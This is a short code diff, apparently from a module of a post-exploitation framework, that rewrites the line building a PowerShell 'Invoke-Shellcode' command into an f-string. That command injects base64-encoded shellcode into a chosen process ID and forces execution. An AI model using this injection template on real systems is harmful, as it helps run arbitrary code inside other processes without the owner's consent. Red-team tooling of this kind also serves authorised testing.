@@ -57,9 +57,7 @@ class Module:
 
                 encoded_sc = helpers.encode_base64(sc)
 
-        script_end = '\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String("{}")) -Force'.format(
-            proc_id, encoded_sc
-        )
+        script_end = f'\nInvoke-Shellcode -ProcessID {proc_id} -Shellcode $([Convert]::FromBase64String("{encoded_sc}")) -Force'
         script_end += f"; shellcode injected into pid {proc_id!s}"
 
         script = main_menu.modulesv2.finalize_module(
